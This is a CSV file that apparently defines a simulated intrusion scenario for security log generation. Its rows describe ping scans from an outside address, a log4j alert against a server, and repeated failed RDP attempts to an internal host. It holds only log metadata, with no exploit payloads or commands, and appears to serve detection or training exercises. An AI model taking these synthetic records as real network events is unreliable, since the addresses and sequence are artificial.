scenarioID,logName,src_ip,src_port,dest_ip,dest_port,proto,service,bytes_seen,bytes_out,timeModifier,userAgent,scanInternal,scanDMZ,alertName,success,answer,value,referrer,idsID,intelSource,query,intelTags,description,firstSeen,indicatorType,mime_type,fileDescription
P9RBRWVC6y7USySbb5jQ8A==,ping_scan,11.34.12.17,54891,,0,icmp,N/A,0,0,25,,FALSE,TRUE,Ping Scan,FALSE,,,,,,,,,,,,
O1QdxqWZNsRI1gQ4CBi1tg==,ping_scan,11.34.12.17,54892,,80,tcp,http,0,0,25,,FALSE,TRUE,Ping Scan,FALSE,,,,,,,,,,,,
NR36optXY12CSmDordl7iA==,ping_scan,11.34.12.17,54891,,443,tcp,https,0,0,25,,FALSE,TRUE,Ping Scan,FALSE,,,,,,,,,,,,
zQ3bSVnXqNXNMzWsOvFMpQ==,ping_scan,11.34.12.17,54892,,8400,tcp,https,0,0,25,,FALSE,TRUE,Ping Scan,FALSE,,,,,,,,,,,,
vtpJeVZdKB6qwg6KG8fA8A==,estreamer,11.34.12.17,52237,134.20.5.14,8400,tcp,http,,,27,,,,log4j,TRUE,,16,,,,,,,,,,
vtpJeVZdKB6qwg6KG8fA8A==,corelight_conn,11.34.12.17,52237,134.20.5.14,8400,tcp,http,,,27,,,,,,,,,,,,,,,,,
vtpJeVZdKB6qwg6KG8fA8A==,corelight_http,11.34.12.17,52237,134.20.5.14,8400,tcp,http,,,27,python requests,,,,,,,,,,,,,,,,
ASdypkX5kV0+BlUAj0HM1Q==,ping_scan,134.20.5.14,33970,,0,icmp,,,,30,,TRUE,TRUE,,,,,,,,,,,,,,
4FjyjvVhCevSJhn/xcL1Hw==,corelight_conn,134.20.5.14,33921,10.1.1.3,3389,tcp,rdp,,,40,,,,,,,,,,,,,,,,,
4FjyjvVhCevSJhn/xcL1Hw==,corelight_rdp,134.20.5.14,33921,10.1.1.3,3389,tcp,rdp,,,40,,,,,no,,,,,,,,,,,,
4FjyjvVhCevSJhn/xcL1Hw==,corelight_rdp,134.20.5.14,33921,10.1.1.3,3389,tcp,rdp,,,40,,,,,no,,,,,,,,,,,,
4FjyjvVhCevSJhn/xcL1Hw==,corelight_rdp,134.20.5.14,33921,10.1.1.3,3389,tcp,rdp,,,40,,,,,no,,,,,,,,,,,,
4FjyjvVhCevSJhn/xcL1Hw==,corelight_rdp,134.20.5.14,33921,10.1.1.3,3389,tcp,rdp,,,40,,,,,no,,,,,,,,,,,,
4FjyjvVhCevSJhn/xcL1Hw==,corelight_rdp,134.20.5.14,33921,10.1.1.3,3389,tcp,rdp,,,40,,,,,no,,,,,,,,,,,,
4FjyjvVhCevSJhn/xcL1Hw==,corelight_rdp,134.20.5.14,33921,10.1.1.3,3389,tcp,rdp,,,40,,,,,no,,,,,,,,,,,,
